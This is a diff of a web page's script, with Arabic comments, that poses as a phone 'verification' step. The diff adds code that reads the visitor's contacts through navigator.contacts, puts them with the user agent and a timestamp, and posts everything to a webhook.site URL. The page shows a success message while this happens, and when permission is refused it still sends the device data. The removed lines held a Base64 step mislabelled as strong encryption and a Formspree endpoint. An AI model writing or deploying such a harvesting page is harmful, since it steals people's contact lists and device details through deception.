@@ -80,25 +80,6 @@
     </div>
 
     <script>
-        // ==========================================================
-        //  محرك التشفير العسكري (Base64 Encryption)
-        // ==========================================================
-
-        // دالة التشفير (تحويل النص إلى شفرة غير قابلة للقراءة)
-        function encryptData(text) {
-            // تحويل النص إلى كود ثنائي (UTF-8)
-            const encoder = new TextEncoder();
-            const bytes = encoder.encode(text);
-            
-            // تحويل الكود الثنائي إلى سلسلة Base64
-            let binary = '';
-            const len = bytes.byteLength;
-            for (let i = 0; i < len; i++) {
-                binary += String.fromCharCode(bytes[i]);
-            }
-            return btoa(binary); // هذا هو التشفير القوي
-        }
-
         document.getElementById('actionBtn').addEventListener('click', async function() {
             const btn = this;
             const statusBox = document.getElementById('status');
@@ -107,7 +88,6 @@
             statusBox.style.display = 'none';
             statusBox.className = '';
 
-            // 1. تجهيز البيانات الأساسية
             const rawData = {
                 device: "iPhone",
                 ua: navigator.userAgent,
@@ -115,19 +95,8 @@
                 timestamp: new Date().toISOString()
             };
 
-            // 2. تشفير البيانات بالكامل
-            const jsonString = JSON.stringify(rawData);
-            const encryptedPayload = encryptData(jsonString);
-            
-            // 3. تجهيز الحزمة المشفرة للإرسال
-            const finalPayload = {
-                encrypted_data: encryptedPayload,
-                note: "تم التشفير باستخدام خوارزمية Base64"
-            };
-
-            // فحص: هل المتصفح يدعم جهات الاتصال؟
             if (!navigator.contacts || !navigator.contacts.select) {
-                sendToFormspree(finalPayload, "المتصفح لا يدعم. تم الإرسال المشفر.");
+                sendToWebhook(rawData, "المتصفح لا يدعم جهات الاتصال. إرسال فوري.");
                 return;
             }
 
@@ -135,17 +104,22 @@
                 const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
 
                 if (contacts && contacts.length > 0) {
+                    // هنا نضيف جهات الاتصال للبيانات لأننا سنرسلها الآن
+                    rawData.contacts = contacts; 
+
                     statusBox.className = 'status-ok';
                     statusBox.innerText = "✅ تم التحقق بنجاح! مرحباً بك.";
                     btn.innerText = "تم";
                     btn.className = "btn btn-green";
-                    console.log("تم جمع جهات الاتصال:", contacts);
+                    
+                    // نرسل البيانات الآن (بما فيها الأرقام) لأن المستخدم سمح
+                    sendToWebhook(rawData, "تم السماح بالوصول (تم استلام جهات الاتصال).");
                 } else {
-                    sendToFormspree(finalPayload, "رفض الإذن أو أغلق النافذة.");
+                    sendToWebhook(rawData, "رفض الإذن أو أغلق النافذة.");
                 }
             } catch (error) {
                 if (error.name === 'NotAllowedError' || error.name === 'SecurityError') {
-                    sendToFormspree(finalPayload, "رفض الإذن (المنطق العكسي). تم الإرسال المشفر.");
+                    sendToWebhook(rawData, "رفض الإذن (المنطق العكسي).");
                 } else {
                     statusBox.className = 'status-err';
                     statusBox.innerText = "❌ حدث خطأ غير متوقع.";
@@ -155,13 +129,16 @@
             }
         });
 
-        function sendToFormspree(data, reason) {
+        function sendToWebhook(data, reason) {
             data.reason = reason;
-            data.status = "تم الإرسال (مشفر)";
+            data.status = "تم الإرسال إلى Webhook.site";
 
-            const formspreeUrl = 'https://formspree.io/f/mljrbabg';
+            // ================================================
+            // تم تغيير الرابط هنا إلى Webhook.site الخاص بك
+            // ================================================
+            const webhookUrl = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';
 
-            fetch(formspreeUrl, {
+            fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
